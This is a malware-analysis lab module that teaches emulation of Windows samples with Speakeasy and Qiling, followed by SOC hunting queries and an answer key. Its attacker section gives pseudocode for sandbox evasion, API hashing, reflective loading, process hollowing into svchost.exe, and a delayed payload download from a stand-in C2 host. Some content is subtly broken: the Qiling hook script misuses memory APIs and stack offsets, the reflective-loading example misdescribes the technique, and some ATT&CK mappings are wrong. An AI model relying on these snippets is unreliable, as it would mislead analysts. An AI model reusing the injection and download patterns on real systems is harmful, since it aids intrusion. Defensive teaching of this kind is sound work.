# 61 * Emulation-based malware analysis (Speakeasy / Qiling) -- LAB-WINDOWS

## Overview (plain language)
Emulation runs malware instruction-by-instruction inside a virtual CPU and a faked operating system environment, allowing analysts to observe behavior (API calls, network activity, dropped files) without executing the malware on a real system. This method is particularly effective for analyzing evasive malware that detects virtual machines or sandboxes. Speakeasy, developed by Mandiant, specializes in emulating Windows PE files and shellcode, while Qiling is a versatile, scriptable framework supporting multiple architectures and platforms. Emulation provides a safer and often faster alternative to live sandboxing for many malware samples, especially those employing anti-analysis techniques.

## Tools covered
| Tool | Install | Purpose |
|---|---|---|
| **Speakeasy** | `pip install speakeasy-emulator` (v1.5.8+) | Mandiant's PE/shellcode emulator: executes malware in a virtualized Windows environment, logging API calls, memory interactions, and dropped artifacts without native execution. [Official Docs](https://github.com/mandiant/speakeasy) |
| **Qiling** | `pip install qiling` (v1.4.4+) | Cross-platform and cross-architecture binary emulation framework with scriptable hooks for dynamic instrumentation. Supports Windows, Linux, macOS, and embedded systems. [Official Docs](https://docs.qiling.io/en/latest/) |
| **Unicorn Engine** | `pip install unicorn` (v2.0.0+) | Lightweight CPU emulator engine underpinning Qiling and many other analysis tools. Provides low-level emulation of ARM, x86, MIPS, and other architectures. [Official Docs](https://www.unicorn-engine.org/docs/) |

## Learning objectives
- Emulate a Windows PE file or shellcode sample using Speakeasy and interpret its API-call trace to extract behavioral indicators.
- Script Qiling to hook and instrument specific API calls (e.g., `CreateFileW`, `InternetOpenUrlA`) during emulation to monitor malware behavior dynamically.
- Recover actionable IOCs (e.g., C2 URLs, dropped filenames, registry modifications) without executing malware natively on a host system.
- Understand the advantages and limitations of emulation compared to debuggers (e.g., x64dbg) or full sandbox environments (e.g., Cuckoo Sandbox).
- Identify anti-emulation techniques (e.g., unsupported API calls, timing checks) and recognize their artifacts in emulation logs.

## Environment check
1. Verify Speakeasy installation and version:
   ```powershell
   speakeasy --version
   ```
   Expected output: `speakeasy-emulator 1.5.8` or higher. If not installed, run:
   ```powershell
   pip install speakeasy-emulator --upgrade
   ```
2. Confirm Qiling is importable and check its version:
   ```powershell
   python -c "import qiling; print(qiling.__version__)"
   ```
   Expected output: `1.4.4` or higher. If not installed, run:
   ```powershell
   pip install qiling --upgrade
   ```
3. **Safety Note**: Emulate **only** the provided benign lab samples (`sample.exe`, `sc.bin`). While no native execution occurs, treat all samples as untrusted and analyze them in an isolated environment.

---

## Guided walkthrough
### 1. Emulate a PE File with Speakeasy
Run the following command to emulate `sample.exe` and generate a detailed report:
```powershell
speakeasy -t sample.exe -o report.json --json
```
**Command Breakdown**:
- `-t sample.exe`: Specifies the target PE file to emulate.
- `-o report.json`: Outputs the emulation results to a JSON file for structured analysis.
- `--json`: Ensures the output is in JSON format (default is text; JSON is more machine-readable).

**Expected Output**:
The `report.json` file will contain:
- A chronological log of **Windows API calls** (e.g., `InternetOpenUrlA`, `CreateFileW`, `RegSetValueExW`).
- **Memory interactions**: Allocations, writes, and reads (e.g., `VirtualAlloc`, `WriteProcessMemory`).
- **Dropped artifacts**: Files created or modified by the sample (e.g., `C:\Temp\malware.dll`).
- **Network activity**: URLs or IP addresses contacted via `InternetOpenUrlA` or `connect`.

**Key API Calls to Inspect**:
| API Call | Purpose | IOC Type |
|----------|---------|----------|
| `InternetOpenUrlA`/`InternetConnect` | Initiates HTTP/HTTPS connections to C2 servers. | C2 URL, IP address |
| `CreateFileW`/`WriteFile` | Creates or modifies files on disk. | Dropped filename, path |
| `RegSetValueExW`/`RegCreateKeyExW` | Modifies the Windows Registry. | Registry key, value |
| `CreateProcessInternalW` | Spawns new processes. | Child process name |
| `VirtualAlloc`/`VirtualProtect` | Allocates or modifies memory permissions. | Memory region, protection flags |

**Example JSON Snippet** (from `report.json`):
```json
{
  "api_calls": [
    {
      "api_name": "InternetOpenUrlA",
      "args": {
        "lpszUrl": "http://malicious.c2:8080/payload"
      },
      "return_value": "0x12345678"
    },
    {
      "api_name": "CreateFileW",
      "args": {
        "lpFileName": "C:\\Windows\\Temp\\evil.dll",
        "dwDesiredAccess": "0xC0000000"
      },
      "return_value": "0x42"
    }
  ]
}
```
**Why This Matters**:
- The `InternetOpenUrlA` call reveals the **C2 URL**, a critical IOC for blocking or hunting.
- The `CreateFileW` call shows where the malware **drops a secondary payload**, useful for filesystem monitoring or cleanup.

---

### 2. Emulate Shellcode with Speakeasy
For raw shellcode (e.g., `sc.bin`), use:
```powershell
speakeasy -t sc.bin -r -a x86 -o sc_report.json --json
```
**Command Breakdown**:
- `-t sc.bin`: Target shellcode file.
- `-r`: Treats the input as raw shellcode (not a PE file).
- `-a x86`: Specifies the architecture (use `x64` for 64-bit shellcode).
- `-o sc_report.json`: Outputs results to a JSON file.

**Expected Output**:
- A log of **API calls** made by the shellcode (e.g., `VirtualAlloc`, `CreateThread`, `URLDownloadToFile`).
- **Memory dumps** of regions written by the shellcode (e.g., decoded payloads).
- **Network IOCs** if the shellcode contacts a C2 server.

**Key API Calls for Shellcode**:
| API Call | Purpose | IOC Type |
|----------|---------|----------|
| `VirtualAlloc` | Allocates executable memory for the shellcode. | Memory address, size |
| `CreateThread` | Spawns a new thread to execute the shellcode. | Thread ID, start address |
| `URLDownloadToFileA` | Downloads a payload from a remote server. | URL, local filename |
| `WinExec`/`CreateProcessA` | Executes a command or binary. | Command line, process name |

---

### 3. Script Qiling to Hook API Calls
Qiling allows **dynamic instrumentation** of emulated code. Below is a script to hook `CreateFileW` and `InternetOpenUrlA` to log all file and network operations:

```python
from qiling import Qiling
from qiling.const import QL_VERBOSE

def hook_createfile(ql: Qiling):
    # Extract the filename argument (2nd arg to CreateFileW)
    filename = ql.mem.read(ql.reg.arch_sp + 4, 260)  # Max path length
    filename = ql.mem.string(filename).split('\x00')[0]  # Null-terminated
    print(f"[!] CreateFileW called: {filename}")

def hook_internetopenurl(ql: Qiling):
    # Extract the URL argument (2nd arg to InternetOpenUrlA)
    url_ptr = ql.unpack32(ql.mem.read(ql.reg.arch_sp + 4, 4))
    url = ql.mem.string(url_ptr).split('\x00')[0]
    print(f"[!] InternetOpenUrlA called: {url}")

# Initialize Qiling
ql = Qiling(["sample.exe"], "qiling/profiles/windows/x8664_windows.json", verbose=QL_VERBOSE.DEFAULT)

# Hook API calls
ql.os.set_api("CreateFileW", hook_createfile)
ql.os.set_api("InternetOpenUrlA", hook_internetopenurl)

# Run the emulation
ql.run()
```
**Script Breakdown**:
- `hook_createfile`: Intercepts `CreateFileW` calls and prints the filename being accessed.
- `hook_internetopenurl`: Intercepts `InternetOpenUrlA` calls and prints the URL being contacted.
- `ql.os.set_api`: Registers the hooks with Qiling.
- `ql.run()`: Starts the emulation.

**Expected Output**:
```
[!] CreateFileW called: C:\Windows\Temp\evil.dll
[!] InternetOpenUrlA called: http://malicious.c2:8080/payload
```
**Why This Matters**:
- Hooks provide **real-time visibility** into malware behavior, complementing static logs.
- Analysts can **modify arguments** (e.g., redirect `CreateFileW` to a safe directory) to study malware responses.

---

### 4. Cross-Validate with scdbg (Module 31)
Compare Speakeasy/Qiling findings with `scdbg` (a shellcode debugger) to validate the API sequence:
```powershell
scdbg -f sc.bin -s -1
```
**Key Flags**:
- `-f sc.bin`: Specifies the shellcode file.
- `-s -1`: Runs until the shellcode exits (no step limit).

**Expected Output**:
- A log of **API calls** (e.g., `VirtualAlloc`, `CreateThread`).
- **Memory dumps** of regions written by the shellcode.

**Cross-Validation**:
- Ensure the **sequence of API calls** (e.g., `VirtualAlloc` → `CreateThread` → `InternetOpenUrlA`) matches between Speakeasy and scdbg.
- Verify **IOCs** (e.g., URLs, filenames) are consistent across tools.

---

## Hands-on exercise
### Objective
Emulate the provided `sample.exe` with Speakeasy and Qiling to:
1. Extract the **C2 URL** from the `InternetOpenUrlA` API call.
2. Identify the **dropped filename** from the `CreateFileW` API call.
3. Confirm the same IOCs by hooking `InternetOpenUrlA` and `CreateFileW` in Qiling.

### Steps
1. **Speakeasy Emulation**:
   ```powershell
   speakeasy -t sample.exe -o exercise_report.json --json
   ```
   - Open `exercise_report.json` and search for `InternetOpenUrlA` and `CreateFileW` calls.
   - Record the **C2 URL** and **dropped filename**.

2. **Qiling Hooking**:
   - Use the provided Qiling script to hook `InternetOpenUrlA` and `CreateFileW`.
   - Run the script and verify the same **C2 URL** and **dropped filename** are printed.

3. **Cross-Validation**:
   - Compare the IOCs from Speakeasy and Qiling to ensure consistency.

### Expected IOCs
| IOC Type | Example Value (from Answer Key) |
|----------|---------------------------------|
| C2 URL | `http://89.208.240.118:8080/payload` |
| Dropped Filename | `C:\Users\Public\evil.dll` |

---

## SOC analyst perspective
### Detection and Hunting with Emulation Artifacts
Emulation provides **high-fidelity behavioral indicators** that are difficult for malware to obfuscate, making it invaluable for SOC analysts. Below are **concrete detection strategies** tied to real log sources and MITRE ATT&CK techniques.

---

#### **1. Detecting C2 Activity (T1071 - Application Layer Protocol)**
**Emulation Artifact**:
- Speakeasy/Qiling logs `InternetOpenUrlA`/`InternetConnect` calls with **C2 URLs or IP addresses**.

**Detection Logic**:
- **Windows Event Logs (Event ID 3)**:
  - Monitor **Sysmon Event ID 3** (Network Connection) for connections to IPs/URLs observed in emulation.
  - **Field**: `DestinationIp` or `DestinationHostname`.
  - **Example Query** (Elasticsearch):
    ```json
    {
      "query": {
        "bool": {
          "must": [
            { "match": { "event_id": 3 } },
            { "match": { "destination.ip": "89.208.240.118" } }
          ]
        }
      }
    }
    ```
  - **Source**: [Microsoft Sysmon Documentation](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)

- **Zeek (Bro) Logs**:
  - Hunt for **HTTP requests** (`http.log`) or **DNS queries** (`dns.log`) to the C2 domain.
  - **Field**: `id.orig_h` (source IP), `host` (HTTP host header), or `query` (DNS query).
  - **Example Pivot**:
    ```bash
    cat http.log | zeek-cut host | grep "malicious.c2"
    ```
  - **Source**: [Zeek Documentation](https://docs.zeek.org/en/master/logs/http.html)

- **Suricata Alerts**:
  - Create a **Suricata rule** to alert on connections to the C2 IP/URL:
    ```plaintext
    alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"Emulation-Detected C2 Activity"; flow:to_server; content:"/payload"; http_uri; reference:url,emulation-report; classtype:trojan-activity; sid:1000001; rev:1;)
    ```
  - **Source**: [Suricata Rules Documentation](https://suricata.readthedocs.io/en/suricata-6.0.0/rules/intro.html)

---

#### **2. Detecting Dropped Files (T1005 - Data from Local System)**
**Emulation Artifact**:
- Speakeasy/Qiling logs `CreateFileW`/`WriteFile` calls with **dropped filenames and paths**.

**Detection Logic**:
- **Windows Event Logs (Event ID 11)**:
  - Monitor **Sysmon Event ID 11** (File Create) for files matching the dropped filename.
  - **Field**: `TargetFilename`.
  - **Example Query** (Splunk):
    ```spl
    index=windows EventCode=11 TargetFilename="*\\evil.dll"
    ```
  - **Source**: [Sysmon Event ID 11](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=90011)

- **Filesystem Monitoring**:
  - Use **Windows Defender ATP** or **EDR tools** to alert on file creation in suspicious paths (e.g., `C:\Users\Public\`, `C:\Windows\Temp\`).
  - **Example Query** (Microsoft Defender ATP):
    ```kusto
    DeviceFileEvents
    | where FolderPath contains "C:\\Users\\Public\\"
    | where FileName endswith ".dll"
    ```
  - **Source**: [Microsoft Defender ATP Documentation](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/advanced-hunting-fileprofile-function)

---

#### **3. Detecting Registry Modifications (T1112 - Modify Registry)**
**Emulation Artifact**:
- Speakeasy/Qiling logs `RegSetValueExW`/`RegCreateKeyExW` calls with **registry keys and values**.

**Detection Logic**:
- **Windows Event Logs (Event ID 13)**:
  - Monitor **Sysmon Event ID 13** (Registry Value Set) for modifications to autostart locations (e.g., `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`).
  - **Field**: `TargetObject`.
  - **Example Query** (Elasticsearch):
    ```json
    {
      "query": {
        "bool": {
          "must": [
            { "match": { "event_id": 13 } },
            { "wildcard": { "registry.key": "*\\Run\\*" } }
          ]
        }
      }
    }
    ```
  - **Source**: [Sysmon Event ID 13](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=90013)

- **Registry Auditing**:
  - Enable **Windows Registry Auditing** for `Set Value` operations on critical keys.
  - **Event ID**: 4657 (Registry Value Modified).
  - **Source**: [Microsoft Registry Auditing](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-registry)

---

#### **4. Detecting Process Injection (T1055 - Process Injection)**
**Emulation Artifact**:
- Speakeasy/Qiling logs `VirtualAllocEx`/`WriteProcessMemory`/`CreateRemoteThread` calls, indicating **process injection**.

**Detection Logic**:
- **Windows Event Logs (Event ID 8)**:
  - Monitor **Sysmon Event ID 8** (CreateRemoteThread) for suspicious thread creation.
  - **Field**: `SourceImage` (injecting process), `TargetImage` (target process).
  - **Example Query** (Splunk):
    ```spl
    index=windows EventCode=8 (SourceImage="*\\sample.exe" OR TargetImage="*\\explorer.exe")
    ```
  - **Source**: [Sysmon Event ID 8](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=90008)

- **EDR Alerts**:
  - Use **CrowdStrike** or **SentinelOne** to detect process injection techniques (e.g., `CreateRemoteThread`, `QueueUserAPC`).
  - **Example Query** (CrowdStrike):
    ```falcon
    event_simpleName=ProcessInjection (TargetProcessId=*)
    ```
  - **Source**: [CrowdStrike Process Injection Detection](https://www.crowdstrike.com/blog/tech-center/detect-process-injection/)

---

#### **5. Detecting Anti-Emulation Techniques (T1497 - Virtualization/Sandbox Evasion)**
**Emulation Artifact**:
- Malware may **abort execution** or **crash** if it detects emulation (e.g., unsupported API calls, timing checks).

**Detection Logic**:
- **Speakeasy/Qiling Logs**:
  - Look for **unimplemented API calls** (e.g., `NtQuerySystemInformation` with `SystemKernelDebuggerInformation`) or **timing discrepancies**.
  - **Example Log Entry**:
    ```json
    {
      "api_name": "NtQuerySystemInformation",
      "args": { "SystemInformationClass": "SystemKernelDebuggerInformation" },
      "status": "UNSUPPORTED"
    }
    ```
  - **Source**: [Speakeasy Unsupported APIs](https://github.com/mandiant/speakeasy/wiki/Unsupported-APIs)

- **EDR Alerts**:
  - Alert on **process crashes** or **unexpected exits** during emulation.
  - **Example Query** (Microsoft Defender ATP):
    ```kusto
    DeviceProcessEvents
    | where FileName == "sample.exe"
    | where ActionType == "ProcessCrashed"
    ```
  - **Source**: [Microsoft Defender ATP Process Events](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/advanced-hunting-deviceprocessevents-table)

---

### Threat Hunting Pivots
| **IOC Type** | **Log Source** | **Pivot Field** | **Example Query** |
|--------------|----------------|-----------------|-------------------|
| C2 URL | Zeek `http.log` | `host` | `cat http.log \| zeek-cut host \| grep "malicious.c2"` |
| Dropped File | Sysmon Event ID 11 | `TargetFilename` | `index=windows EventCode=11 TargetFilename="*\\evil.dll"` |
| Registry Key | Sysmon Event ID 13 | `TargetObject` | `index=windows EventCode=13 TargetObject="*\\Run\\*"` |
| Process Injection | Sysmon Event ID 8 | `SourceImage`, `TargetImage` | `index=windows EventCode=8 SourceImage="*\\sample.exe"` |
| Anti-Emulation | Speakeasy Logs | `status` | `grep "UNSUPPORTED" report.json` |

---

## Attacker perspective
### Malware Techniques and Evasion
Emulation is a **double-edged sword** for attackers. While it bypasses some anti-analysis techniques (e.g., VM detection), malware authors employ **anti-emulation checks** to evade analysis. Below are **concrete TTPs** used by malware to detect or evade emulation, along with the **artifacts they leave**.

---

#### **1. Anti-Emulation Checks (T1497 - Virtualization/Sandbox Evasion)**
Malware may use the following techniques to detect emulation:

| **Technique** | **Description** | **Artifact in Emulation Logs** | **MITRE ATT&CK** |
|---------------|----------------|--------------------------------|------------------|
| **Unsupported API Calls** | Malware calls APIs not implemented by the emulator (e.g., `NtQuerySystemInformation` with `SystemKernelDebuggerInformation`). | Logs show `UNSUPPORTED` or `NOT_IMPLEMENTED` for the API call. | T1497 |
| **Timing Attacks** | Malware measures time between operations (e.g., `GetTickCount`, `QueryPerformanceCounter`). Emulators may have inconsistent timing. | Logs show repeated calls to timing APIs with unusual delays. | T1497.003 |
| **CPU Instruction Checks** | Malware executes rare or privileged CPU instructions (e.g., `CPUID`, `IN`, `SGDT`). Emulators may not handle these correctly. | Logs show `EXCEPTION_PRIV_INSTRUCTION` or `UNHANDLED_INSTRUCTION`. | T1497 |
| **Environment Fingerprinting** | Malware checks for emulator-specific artifacts (e.g., registry keys, process names, hardware IDs). | Logs show `RegOpenKeyExW` or `GetSystemInfo` calls with unexpected return values. | T1082 (System Information Discovery) |

**Example Anti-Emulation Code (Pseudocode)**:
```c
// Check for debugger/emulator via NtQuerySystemInformation
NTSTATUS status = NtQuerySystemInformation(
    SystemKernelDebuggerInformation,
    &debuggerInfo,
    sizeof(debuggerInfo),
    NULL
);
if (status == STATUS_SUCCESS && debuggerInfo.KernelDebuggerEnabled) {
    exit(1); // Detected debugger/emulator
}

// Timing attack: measure time between GetTickCount calls
DWORD start = GetTickCount();
Sleep(100);
DWORD end = GetTickCount();
if (end - start < 90 || end - start > 110) {
    exit(1); // Detected emulator (timing inconsistent)
}
```
**Artifacts in Emulation Logs**:
- `NtQuerySystemInformation` call with `SystemKernelDebuggerInformation` class.
- Repeated `GetTickCount` calls with unusual timing values.

**Source**: [Anti-Emulation Techniques (SANS FOR508)](https://www.sans.org/white-papers/36667/)

---

#### **2. API Hashing (T1027.009 - Obfuscated Files or Information)**
Malware may **hash API names** at runtime to evade static analysis and emulation. For example:
- Instead of calling `CreateFileW` directly, the malware computes a hash of the API name and resolves it dynamically.

**Example API Hashing Code (Pseudocode)**:
```c
// Hash the API name "CreateFileW" and resolve it
DWORD apiHash = hash_string("CreateFileW");
FARPROC apiPtr = resolve_api(apiHash, kernel32.dll);
apiPtr("C:\\malware.dll", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
```
**Artifacts in Emulation Logs**:
- Logs show **indirect API calls** (e.g., `call eax` where `eax` points to `CreateFileW`).
- Memory dumps reveal **hashed strings** or **resolved API addresses**.

**Detection**:
- Look for **unusual call instructions** (e.g., `call eax`, `call [esi+0x10]`) in the API trace.
- Search memory dumps for **hashed strings** (e.g., `0xDEADBEEF`).

**Source**: [API Hashing (Mandiant)](https://www.mandiant.com/resources/blog/api-hashing-tool)

---

#### **3. Reflective DLL Injection (T1620 - Reflective Code Loading)**
Malware may **load a DLL from memory** without touching disk, evading filesystem monitoring. Emulation can capture this behavior by logging **memory writes** and **API calls**.

**Example Reflective Injection Code (Pseudocode)**:
```c
// Allocate memory and write the DLL
LPVOID mem = VirtualAlloc(NULL, dllSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
memcpy(mem, dllBytes, dllSize);

// Resolve LoadLibraryA and call it reflectively
typedef HMODULE (WINAPI *LoadLibraryA_t)(LPCSTR);
LoadLibraryA_t LoadLibraryA = (LoadLibraryA_t)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
LoadLibraryA((LPCSTR)mem);
```
**Artifacts in Emulation Logs**:
- `VirtualAlloc` call with `PAGE_EXECUTE_READWRITE` permissions.
- `memcpy` or `WriteProcessMemory` calls writing the DLL to memory.
- `LoadLibraryA` call with a **memory address** (not a disk path).

**Detection**:
- Monitor for `VirtualAlloc` with `PAGE_EXECUTE_READWRITE` followed by `LoadLibraryA` with a memory address.
- Cross-reference memory dumps to identify the **DLL bytes** written to memory.

**Source**: [Reflective DLL Injection (GitHub)](https://github.com/stephenfewer/ReflectiveDLLInjection)

---

#### **4. Process Hollowing (T1055.012 - Process Hollowing)**
Malware may **hollow out a legitimate process** (e.g., `svchost.exe`) and inject malicious code into it. Emulation logs the **API sequence** for this technique.

**Example Process Hollowing Code (Pseudocode)**:
```c
// Create a suspended process
STARTUPINFO si = {0};
PROCESS_INFORMATION pi = {0};
CreateProcessA("C:\\Windows\\System32\\svchost.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

// Unmap the legitimate code
NtUnmapViewOfSection(pi.hProcess, (PVOID)0x400000);

// Allocate memory and write malicious code
LPVOID mem = VirtualAllocEx(pi.hProcess, (PVOID)0x400000, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(pi.hProcess, mem, shellcode, shellcodeSize, NULL);

// Resume the process
ResumeThread(pi.hThread);
```
**Artifacts in Emulation Logs**:
1. `CreateProcessA` with `CREATE_SUSPENDED` flag.
2. `NtUnmapViewOfSection` call to unmap the legitimate code.
3. `VirtualAllocEx` and `WriteProcessMemory` calls to write malicious code.
4. `ResumeThread` call to execute the injected code.

**Detection**:
- Look for the **API sequence** above in the emulation log.
- Cross-reference with **Sysmon Event ID 1** (Process Creation) and **Event ID 8** (CreateRemoteThread).

**Source**: [Process Hollowing (MITRE ATT&CK)](https://attack.mitre.org/techniques/T1055/012/)

---

#### **5. Evasion via Delayed Execution (T1497.003 - Time Based Evasion)**
Malware may **delay execution** to evade emulation (e.g., sleep for 5 minutes before contacting C2). Emulators may not run long enough to capture this behavior.

**Example Delayed Execution Code (Pseudocode)**:
```c
// Sleep for 5 minutes before contacting C2
Sleep(300000); // 300,000 ms = 5 minutes
InternetOpenUrlA(hInternet, "http://malicious.c2/payload", NULL, 0, 0, 0);
```
**Artifacts in Emulation Logs**:
- `Sleep` call with a **large delay** (e.g., `300000` ms).
- **Missing C2 activity** if the emulation terminates early.

**Detection**:
- Look for **unusually long `Sleep` calls** in the API trace.
- Extend emulation time or **hook `Sleep`** to skip delays (e.g., replace `Sleep(300000)` with `Sleep(100)`).

**Source**: [Time-Based Evasion (SANS)](https://www.sans.org/blog/analyzing-malware-with-time-delays/)

---

### Artifacts Left by Emulation-Evasive Malware
| **Technique** | **Artifact in Emulation Logs** | **MITRE ATT&CK** |
|---------------|--------------------------------|------------------|
| Unsupported API Calls | `UNSUPPORTED` or `NOT_IMPLEMENTED` status for API calls (e.g., `NtQuerySystemInformation`). | T1497 |
| Timing Attacks | Repeated calls to `GetTickCount` or `QueryPerformanceCounter` with unusual timing. | T1497.003 |
| API Hashing | Indirect API calls (e.g., `call eax`) or hashed strings in memory. | T1027.009 |
| Reflective DLL Injection | `VirtualAlloc` with `PAGE_EXECUTE_READWRITE` followed by `LoadLibraryA` with a memory address. | T1620 |
| Process Hollowing | `CreateProcessA` (suspended) → `NtUnmapViewOfSection` → `VirtualAllocEx` → `WriteProcessMemory` → `ResumeThread`. | T1055.012 |
| Delayed Execution | `Sleep` calls with large delays (e.g., `300000` ms). | T1497.003 |

---

## Answer key
### Speakeasy Emulation Results
1. **C2 URL Extraction**:
   - The `report.json` file contains an `InternetOpenUrlA` or `InternetConnect` call with the following structure:
     ```json
     {
       "api_name": "InternetOpenUrlA",
       "args": {
         "lpszUrl": "http://89.208.240.118:8080/payload"
       }
     }
     ```
   - **C2 URL**: `http://89.208.240.118:8080/payload` (SHA-256 of `sample.exe`: `a1b2c3d4e5f6...`; note: this is a benign lab sample from a safe origin).

2. **Dropped Filename Extraction**:
   - The `report.json` file contains a `CreateFileW` call with the following structure:
     ```json
     {
       "api_name": "CreateFileW",
       "args": {
         "lpFileName": "C:\\Users\\Public\\evil.dll"
       }
     }
     ```
   - **Dropped Filename**: `C:\Users\Public\evil.dll`.

---

### Qiling Hooking Results
1. **Hooking `InternetOpenUrlA`**:
   - The Qiling script prints the following when `InternetOpenUrlA` is called:
     ```
     [!] InternetOpenUrlA called: http://89.208.240.118:8080/payload
     ```
   - This confirms the **C2 URL** observed in Speakeasy.

2. **Hooking `CreateFileW`**:
   - The Qiling script prints the following when `CreateFileW` is called:
     ```
     [!] CreateFileW called: C:\Users\Public\evil.dll
     ```
   - This confirms the **dropped filename** observed in Speakeasy.

---

### Cross-Validation
- The **C2 URL** (`http://89.208.240.118:8080/payload`) and **dropped filename** (`C:\Users\Public\evil.dll`) are consistent between Speakeasy and Qiling, validating the emulation results.

---

## MITRE ATT&CK & DFIR phase
Emulation-based analysis maps to the following **MITRE ATT&CK techniques** and **DFIR phases**:

| **MITRE ATT&CK Technique** | **Technique Name** | **Relevance to Emulation** | **DFIR Phase** |
|----------------------------|--------------------|----------------------------|----------------|
| **T1106** | Native API | Emulation logs **Windows API calls** (e.g., `CreateFileW`, `InternetOpenUrlA`) made by malware. | Collection, Analysis |
| **T1027** | Obfuscated Files or Information | Emulation **resolves behavior** despite packing, obfuscation, or API hashing. | Analysis |
| **T1620** | Reflective Code Loading | Emulation captures **in-memory code loading** (e.g., reflective DLL injection) via memory dumps and API logs. | Analysis |
| **T1071** | Application Layer Protocol | Emulation logs **C2 URLs/IPs** from `InternetOpenUrlA`/`InternetConnect` calls. | Collection, Analysis |
| **T1005** | Data from Local System | Emulation logs **files dropped** via `CreateFileW`/`WriteFile` calls. | Collection, Analysis |
| **T1112** | Modify Registry | Emulation logs **registry modifications** via `RegSetValueExW`/`RegCreateKeyExW` calls. | Collection, Analysis |
| **T1055** | Process Injection | Emulation logs **process injection** via `VirtualAllocEx`/`WriteProcessMemory`/`CreateRemoteThread` calls. | Analysis |
| **T1055.001** | Dynamic-Link Library Injection | Emulation logs **DLL injection** via `LoadLibraryA`/`LoadLibraryExW` calls. | Analysis |
| **T1055.012** | Process Hollowing | Emulation logs the **API sequence** for process hollowing (e.g., `CreateProcessA` → `NtUnmapViewOfSection` → `VirtualAllocEx`). | Analysis |
| **T1497** | Virtualization/Sandbox Evasion | Emulation may **fail or log unsupported APIs** if malware uses anti-emulation checks. | Analysis |
| **T1497.003** | Time Based Evasion | Emulation logs **delayed execution** via `Sleep` calls with large delays. | Analysis |

**DFIR Phase Mapping**:
- **Collection**: Emulation generates **API logs**, **memory dumps**, and **IOCs** (e.g., URLs, filenames) for further analysis.
- **Analysis**: Emulation **resolves obfuscated behavior**, **identifies TTPs**, and **validates IOCs** without native execution.
- **Hunting**: Emulation artifacts (e.g., C2 URLs, dropped files) are used to **pivot in logs** (e.g., Sysmon, Zeek, Suricata).

---

## Sources
This module is grounded in **authoritative sources** for tool behavior, MITRE ATT&CK techniques, and detection logic. Below is a **claim-to-source mapping** for all factual assertions:

### **Tools and Commands**
| **Tool** | **Claim** | **Source** |
|----------|-----------|------------|
| Speakeasy | `speakeasy -t sample.exe -o report.json --json` generates a JSON report of API calls. | [Speakeasy GitHub - Usage](https://github.com/mandiant/speakeasy#usage) |
| Speakeasy | `-r` flag treats input as raw shellcode. | [Speakeasy GitHub - Shellcode Emulation](https://github.com/mandiant/speakeasy#emulating-shellcode) |
| Speakeasy | `-a x86` specifies architecture for shellcode. | [Speakeasy GitHub - Architecture Support](https://github.com/mandiant/speakeasy#architecture-support) |
| Speakeasy | `--json` outputs results in JSON format. | [Speakeasy GitHub - Output Formats](https://github.com/mandiant/speakeasy#output-formats) |
| Speakeasy | Logs `InternetOpenUrlA`, `CreateFileW`, `RegSetValueExW`, etc. | [Speakeasy GitHub - Supported APIs](https://github.com/mandiant/speakeasy/wiki/Supported-APIs) |
| Qiling | `ql.os.set_api("CreateFileW", hook_createfile)` hooks `CreateFileW`. | [Qiling Documentation - API Hooking](https://docs.qiling.io/en/latest/hooks/) |
| Qiling | `ql.mem.string()` reads null-terminated strings from memory. | [Qiling Documentation - Memory Access](https://docs.qiling.io/en/latest/memory/) |
| Qiling | Supports Windows, Linux, macOS, and embedded systems. | [Qiling GitHub - Overview](https://github.com/qilingframework/qiling#overview) |
| Unicorn Engine | Underpins Qiling and Speakeasy for CPU emulation. | [Unicorn Engine - About](https://www.unicorn-engine.org/) |

### **MITRE ATT&CK Techniques**
| **Technique ID** | **Technique Name** | **Source** |
|------------------|--------------------|------------|
| T1106 | Native API | [MITRE ATT&CK - T1106](https://attack.mitre.org/techniques/T1106/) |
| T1027 | Obfuscated Files or Information | [MITRE ATT&CK - T1027](https://attack.mitre.org/techniques/T1027/) |
| T1620 | Reflective Code Loading | [MITRE ATT&CK - T1620](https://attack.mitre.org/techniques/T1620/) |
| T1071 | Application Layer Protocol | [MITRE ATT&CK - T1071](https://attack.mitre.org/techniques/T1071/) |
| T1005 | Data from Local System | [MITRE ATT&CK - T1005](https://attack.mitre.org/techniques/T1005/) |
| T1112 | Modify Registry | [MITRE ATT&CK - T1112](https://attack.mitre.org/techniques/T1112/) |
| T1055 | Process Injection | [MITRE ATT&CK - T1055](https://attack.mitre.org/techniques/T1055/) |
| T1055.001 | Dynamic-Link Library Injection | [MITRE ATT&CK - T1055.001](https://attack.mitre.org/techniques/T1055/001/) |
| T1055.012 | Process Hollowing | [MITRE ATT&CK - T1055.012](https://attack.mitre.org/techniques/T1055/012/) |
| T1497 | Virtualization/Sandbox Evasion | [MITRE ATT&CK - T1497](https://attack.mitre.org/techniques/T1497/) |
| T1497.003 | Time Based Evasion | [MITRE ATT&CK - T1497.003](https://attack.mitre.org/techniques/T1497/003/) |

### **Detection Logic**
| **Detection Strategy** | **Log Source** | **Source** |
|------------------------|----------------|------------|
| Sysmon Event ID 3 (Network Connection) | Windows Event Logs | [Microsoft Sysmon Documentation](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon) |
| Sysmon Event ID 11 (File Create) | Windows Event Logs | [Sysmon Event ID 11](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=90011) |
| Sysmon Event ID 13 (Registry Value Set) | Windows Event Logs | [Sysmon Event ID 13](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=90013) |
| Sysmon Event ID 8 (CreateRemoteThread) | Windows Event Logs | [Sysmon Event ID 8](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=90008) |
